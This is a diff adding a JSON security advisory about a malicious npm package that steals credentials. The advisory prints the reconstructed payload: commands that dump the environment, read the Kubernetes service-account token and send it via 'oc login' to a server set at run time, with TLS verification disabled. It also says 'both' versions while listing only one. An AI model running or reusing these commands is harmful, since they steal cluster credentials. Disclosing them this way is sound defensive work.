@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14328",
+  "modified": "2026-11-19T18:40:14Z",
+  "published": "2026-11-19T18:37:49Z",
+  "summary": "Malicious code in oceanx-diagnostics-tool (npm)",
+  "details": "Both published versions ship package/tester.sh, presented as a network/diagnostics helper, that reassembles and executes hidden shell commands at runtime. The script splits each command into 17 single-character variables, concatenates them and passes the result to eval, so the real commands never appear as literal strings in the file. Reconstructed, the payload runs three commands in order: it executes printenv to dump the process environment, it runs export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token) to read the Kubernetes service-account bearer token from its standard in-cluster path, and it then runs./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify, sending that token to a caller-controllable OpenShift server with TLS certificate verification disabled. The package's documentation describes benign hostname/HTTPS diagnostics, but the shipped JavaScript implements only a DNS/HTTP client that performs no hostname collection, so the fragmentation and eval block is the only credential-handling code in the tarball and has no diagnostic purpose. No C2 host is hardcoded: the exfiltration destination is supplied at run time through the SERV environment variable.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "oceanx-diagnostics-tool",
+        "purl": "pkg:npm/oceanx-diagnostics-tool"
+      },
+      "versions": [
+        "0.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/oceanx-diagnostics-tool/v/0.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14328"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-19T18:37:49Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "kubernetes[.]io"
+        ],
+        "sha256": [
+          "6b66eb8e2cb95219092cf0480d2475951a3ca9a08e3fb41d3139b684af41db7a"
+        ]
+      }
+    }
+  }
+}
